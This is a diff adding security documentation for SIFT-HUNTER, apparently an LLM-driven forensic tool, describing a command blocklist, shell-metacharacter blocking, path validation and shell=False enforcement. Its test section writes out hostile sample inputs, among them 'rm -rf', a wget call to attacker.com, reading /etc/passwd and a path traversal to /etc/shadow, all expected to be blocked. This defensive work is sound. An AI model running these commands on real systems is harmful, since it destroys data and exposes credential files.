@@ -1,0 +1,68 @@
+# Security Boundary Documentation
+
+## Design Philosophy
+
+Security in SIFT-HUNTER is **architectural**, not prompt-based.
+The LLM cannot accidentally or intentionally execute destructive commands because:
+
+1. No shell access is exposed — all subprocess calls use `shell=False`
+2. The blocklist is enforced in Python before any tool function executes
+3. Path validation resolves symlinks and checks against an explicit allowlist
+4. Every tool function requires `@read_only` and `@validated_path` decorators
+
+## Layers of Defense
+
+### Layer 1: Command Blocklist (`mcp_server/security.py`)
+
+Permanently blocked commands (non-exhaustive):
+
+```
+Destructive:  rm, rmdir, shred, dd, mkfs, fdisk, format, wipefs
+Network:      wget, curl, nc, ssh, scp, sftp, ftp, rsync
+Privilege:    sudo, su, chmod, chown, mount, kill
+Shell spawns: bash, sh, python, perl, ruby, node
+Write tools:  cp, mv, tee, install
+```
+
+### Layer 2: Metacharacter Blocking
+
+Shell injection via chaining is blocked:
+- `;` (sequential execution)
+- `&&`, `||` (conditional execution)  
+- `` ` `` (backtick subshell)
+- `$(...)` (subshell expansion)
+
+### Layer 3: Path Validation (`mcp_server/validators/path_validator.py`)
+
+Before any file is accessed:
+1. `Path.resolve()` is called — expands `..`, follows symlinks
+2. Result checked against ABSOLUTE_BLOCKED list (`/dev`, `/proc`, `/sys`, `/etc/shadow`)
+3. Result must be under one of the configured EVIDENCE_ROOTS
+4. `/tmp` access blocked unless `allow_tmp=True` (output staging only)
+
+### Layer 4: `shell=False` Enforcement
+
+All `subprocess.run()` calls in the codebase use `shell=False`.
+Arguments are passed as lists, not strings — prevents shell interpretation.
+
+## Testing Security Boundaries
+
+```bash
+# Run all security tests
+pytest tests/test_security.py -v
+
+# Interactive test via CLI
+sift-hunter check "rm -rf /evidence"                   # BLOCKED
+sift-hunter check "wget http://attacker.com"           # BLOCKED
+sift-hunter check "bash -c 'cat /etc/passwd'"          # BLOCKED
+sift-hunter check "../../etc/shadow"                   # BLOCKED (path traversal)
+sift-hunter check "vol3 -f evidence.mem pslist"        # ALLOWED
+```
+
+## Evidence Root Configuration
+
+```bash
+export SIFT_EVIDENCE_ROOTS="/cases:/mnt/evidence:/media/usb-evidence"
+```
+
+Only paths under these roots can be accessed. An attempt to read `/etc/passwd` from an agent tool call will raise `SecurityError` before any file I/O occurs.
